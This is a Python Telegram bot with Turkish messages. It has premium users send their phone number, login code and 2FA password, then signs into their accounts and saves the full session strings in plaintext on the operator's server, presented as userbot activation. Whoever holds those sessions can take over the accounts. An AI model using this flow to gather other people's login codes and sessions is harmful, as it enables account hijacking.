import json, os
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

PREMIUM_FILE = "data/premium.json"
SESSIONS_FILE = "data/sessions.json"

bot = TelegramClient("loginbot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

STEPS = {}
TEMP = {}

def load_json(path, default):
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f)
    with open(path) as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def is_premium(uid):
    data = load_json(PREMIUM_FILE, {"users": []})
    return uid == OWNER_ID or uid in data["users"]

@bot.on(events.NewMessage(pattern="/pre"))
async def pre(event):
    if event.sender_id != OWNER_ID:
        return await event.reply("⛔ Yetkin yok")

    try:
        uid = int(event.raw_text.split()[1])
    except:
        return await event.reply("❌ /pre USER_ID")

    data = load_json(PREMIUM_FILE, {"users": []})
    if uid not in data["users"]:
        data["users"].append(uid)
        save_json(PREMIUM_FILE, data)

    await event.reply(f"✅ {uid} premium yapıldı canımm")

@bot.on(events.NewMessage(pattern="/login"))
async def login(event):
    uid = event.sender_id

    if not is_premium(uid):
        return await event.reply("⛔ Premium değilsin gardaşım @OfficialKiyici Hesabına ulaş.")

    STEPS[uid] = "phone"
    await event.reply("📱 Telefon numaranı gönder (+90...)")

@bot.on(events.NewMessage)
async def steps(event):
    uid = event.sender_id
    if uid not in STEPS:
        return

    text = event.raw_text.strip()

    if STEPS[uid] == "phone":
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(text)

        TEMP[uid] = {"client": client, "phone": text}
        STEPS[uid] = "code"
        return await event.reply("📩 Kodu gönder (1 2 3 4 5)")

    if STEPS[uid] == "code":
        data = TEMP[uid]
        try:
            await data["client"].sign_in(data["phone"], text.replace(" ", ""))
        except SessionPasswordNeededError:
            STEPS[uid] = "password"
            return await event.reply("🔐 2FA şifreni gir")

        session = data["client"].session.save()

        sessions = load_json(SESSIONS_FILE, {})
        sessions[str(uid)] = session
        save_json(SESSIONS_FILE, sessions)

        await data["client"].disconnect()
        STEPS.pop(uid)
        TEMP.pop(uid)

        return await event.reply("✅ Giriş tamamlandı, userbot aktif")

    if STEPS[uid] == "password":
        data = TEMP[uid]
        await data["client"].sign_in(password=text)

        session = data["client"].session.save()
        sessions = load_json(SESSIONS_FILE, {})
        sessions[str(uid)] = session
        save_json(SESSIONS_FILE, sessions)

        await data["client"].disconnect()
        STEPS.pop(uid)
        TEMP.pop(uid)

        await event.reply("✅ Giriş tamamlandı")

print("🔐 Login bot hazır")
bot.run_until_disconnected()
